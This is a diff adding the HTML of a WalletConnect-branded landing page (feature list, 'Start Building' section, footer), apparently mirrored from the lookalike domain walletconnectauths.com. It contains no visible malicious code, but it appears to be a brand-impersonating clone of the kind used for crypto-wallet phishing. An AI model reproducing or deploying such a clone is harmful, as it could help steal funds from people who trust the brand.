+    <div class="col-md-4 text-center" style="padding: 2% 2% 2% 2%!important;">
+        <img src="Main/assets/feature-icons/multi-session.svg">
+        <br>
+        <br>
+        <h5>Multi Session</h5>
+        <p>Manage as many sessions as needed. A flexible API is provided to build the desired UX.</p>
+
+    </div>
+
+
+    <div class="col-md-4 text-center" style="padding: 2% 2% 2% 2%!important;">
+        <img src="Main/assets/feature-icons/one-time-pairing.svg">
+        <br>
+        <br>
+        <h5>One-time Pairing</h5>
+        <p>Establishes multiple sessions from a single pairing. Only one connection for an infinite number of sessions.</p>
+
+    </div>
+
+
+    <div class="col-md-4 text-center" style="padding: 2% 2% 2% 2%!important;">
+        <img src="Main/assets/feature-icons/reduced-bandwidth.svg">
+        <br>
+        <br>
+        <h5>Reduced Bandwidth</h5>
+        <p>Websocket management efficiently re-uses resources to multiplex all messages through a single socket without interruption.</p>
+
+    </div>
+
+
+    <div class="col-md-4 text-center" style="padding: 2% 2% 2% 2%!important;">
+        <img src="Main/assets/feature-icons/decentralized-messaging.svg">
+        <br>
+        <br>
+        <h5>Decentralized Messaging</h5>
+        <p>Message relaying now uses Waku network to gossip messages through all nodes. No more depending on centralized servers.</p>
+
+    </div>
+
+
+
+    <div class="col-md-4 text-center" style="padding: 2% 2% 2% 2%!important;">
+        <img src="Main/assets/feature-icons/permission-system.svg">
+        <br>
+        <br>
+        <h5>Permission System</h5>
+        <p>Explicitly require wallets to meet compatibility with all signing methods that your dapp requires.</p>
+
+    </div>
+
+
+
+    <div class="col-md-4 text-center" style="padding: 2% 2% 2% 2%!important;">
+        <img src="Main/assets/feature-icons/guaranteed-delivery.svg">
+        <br>
+        <br>
+        <h5>Guaranteed Delivery</h5>
+        <p>Smarter caching mechanisms guarantee message delivery in more diverse network conditions.</p>
+
+    </div>
+
+
+
+    <div class="col-md-4 text-center" style="padding: 2% 2% 2% 2%!important;">
+        <img src="Main/assets/feature-icons/platform-agnostic.svg">
+        <br>
+        <br>
+        <h5>Platform Agnostic</h5>
+        <p>Works everywhere across desktop apps, browser apps, mobile apps, gaming apps and much more.</p>
+
+    </div>
+
+
+</div>
+
+<div class="row mt-5" style="padding: 7% 0% !important;">
+    <div class="col-md-3">
+
+    </div>
+    <div class="col-md-6 text-center" style="padding: 2% 2% 2% 5%!important;">
+        <h5 style="color:#2b6cb0">For Developers</h5>
+        <h2 style="font-weight:900;color:#2b6cb0; font-size:3rem; font-family:'Segoe UI'; line-height:65px;">Start Building</h2>
+
+        <p style="font-size: 1.2rem;">To quickly setup for your Dapp or Wallet, create a cloud account for relay server access, then check out our code examples and quick start guide.</p>
+
+        <button class="btn btn-primary btn-lg"><b>Get Started</b></button> <button class="btn btn-lg" style="color:black; background-color:#edf2f7"><b>Read the docs</b></button>
+    </div>
+
+    <div class="col-md-3">
+
+    </div>
+
+</div>
+        </main>
+    </div>
+
+    <footer class="border-top  text-muted">
+        <div class="container-fluid">
+            <div class="row">
+                <div class="col-md-8">
+                    <div class="row">
+                        <div class="col-md-3">
+                            <h5>Links</h5>
+                            &nbsp;
+                            <p>Blog</p>
+                            <p>FAQ</p>
+                            <p>Terms</p>
+                            <p>Privacy Policy</p>
+                        </div>
+                        <div class="col-md-3">
+                            <h5>Registry</h5>
+                            &nbsp;
+                            <p>Wallets</p>
+                            <p>Dapps</p>
+                        </div>
+                        <div class="col-md-3">
+                            <h5>Resources</h5>
+                            &nbsp;
+                            <p>Documentation</p>
+                            <p>Github</p>
+                        </div>
+                        <div class="col-md-3">
+                            <h5>Contact</h5>
+                            &nbsp;
+                            <p>Discord</p>
+                            <p>Twitter</p>
+                        </div>
+
+                    </div>
+                </div>
+
+                <div class="col-md-4">
+                    <h5>Subscribe to our newsletter!</h5>
+                    &nbsp;
+                    <p>Be the first to learn the news about new features and product updates.</p>
+                    <div class="row">
+                        <div class="col-md-10" style="padding-right:0">
+                            <input type="email" class="form-control" style="border-radius: 3px 0 0 3px;" placeholder="join our newsletter">
+                        </div>
+                        <div class="col-sm-12 col-md-2" style="padding-left:0">
+                            <button class="btn btn-primary" style="border-radius: 0 3px 3px 0;">Subscribe</button>
+                        </div>
+
+                    </div>
+
+
+                </div>
+            </div>
+            <div class="row">
+                <div class="col-md-9">
+                    <br>
+                    <p><img src="Main/WalletConnectlogo.png" style="margin-top:-1.5%;"> &nbsp; &nbsp; &nbsp;  &nbsp; &nbsp; &nbsp; <a href="#"><i class="fab fa-1x fa-github mt-5"></i></a> <a href="#"><i class="fab fa-1x fa-twitter mt-5"></i></a>  <a href="#"><i class="fab fa-1x fa-discord mt-5"></i></a> </p>
+                </div>
+
+                <div class="col-md-3">
+                    <p class="text-right"><i class="fa fa-moon" style="color:#a1adbf;"> &nbsp;</i>© 2021 - WalletConnect Inc </p>
+                </div>
+                <br>
+                <br>
+            </div>
+            <br>
+            <br>
+        </div>
+    </footer>
+
+    <script src="lib/jquery/dist/jquery.min.js"></script>
+    <script src="lib/bootstrap/dist/js/bootstrap.bundle.min.js"></script>
+    <script src="js/site519a.js?v=dLGP40S79Xnx6GqUthRF6NWvjvhQ1nOvdVSwaNcgG18"></script>
+
+    
+
+
+
+
+</body><!-- Mirrored from walletconnectauths.com/ by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 16 Mar 2022 14:16:38 GMT --></html>
